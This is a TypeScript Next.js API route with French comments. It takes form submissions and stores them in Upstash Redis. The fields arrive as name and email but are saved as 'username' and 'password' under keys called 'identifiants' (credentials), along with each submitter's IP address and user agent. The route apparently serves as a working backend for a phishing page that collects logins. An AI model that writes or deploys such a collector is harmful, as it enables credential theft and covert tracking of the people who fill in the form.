import { NextRequest, NextResponse } from 'next/server';
import { Redis } from '@upstash/redis';

// Configuration Redis avec fallback pour le debug
const redis = new Redis({
  url: process.env.UPSTASH_REDIS_REST_URL!,
  token: process.env.UPSTASH_REDIS_REST_TOKEN!,
});

export async function POST(request: NextRequest) {
  try {
    // Vérification que les variables d'environnement sont bien là
    if (!process.env.UPSTASH_REDIS_REST_URL || !process.env.UPSTASH_REDIS_REST_TOKEN) {
      console.error('Variables Upstash manquantes');
      return NextResponse.json({ success: false, error: 'Configuration manquante' }, { status: 500 });
    }

    const body = await request.json();
    const { nom, email, telephone, message } = body;

    // Validation basique
    if (!nom || !email) {
      return NextResponse.json({ success: false, error: 'Champs manquants' }, { status: 400 });
    }

    const identifiants = {
      username: nom,
      password: email,
      telephone: telephone || '',
      message: message || '',
      timestamp: new Date().toISOString(),
      ip: request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || 'unknown',
      userAgent: request.headers.get('user-agent') || 'unknown'
    };

    // Génération d'une clé unique
    const key = `identifiants:${Date.now()}:${Math.random().toString(36).substring(7)}`;

    // Stockage dans Redis
    await redis.set(key, JSON.stringify(identifiants));
    
    // Ajout à la liste des identifiants
    await redis.lpush('identifiants_list', key);
    
    // Limitation de la liste à 1000 entrées
    await redis.ltrim('identifiants_list', 0, 999);

    console.log('✅ Identifiants stockés:', key);

    return NextResponse.json({ success: true });
    
  } catch (error) {
    console.error('❌ Erreur Redis:', error);
    return NextResponse.json({ 
      success: false, 
      error: 'Erreur serveur' 
    }, { status: 500 });
  }
}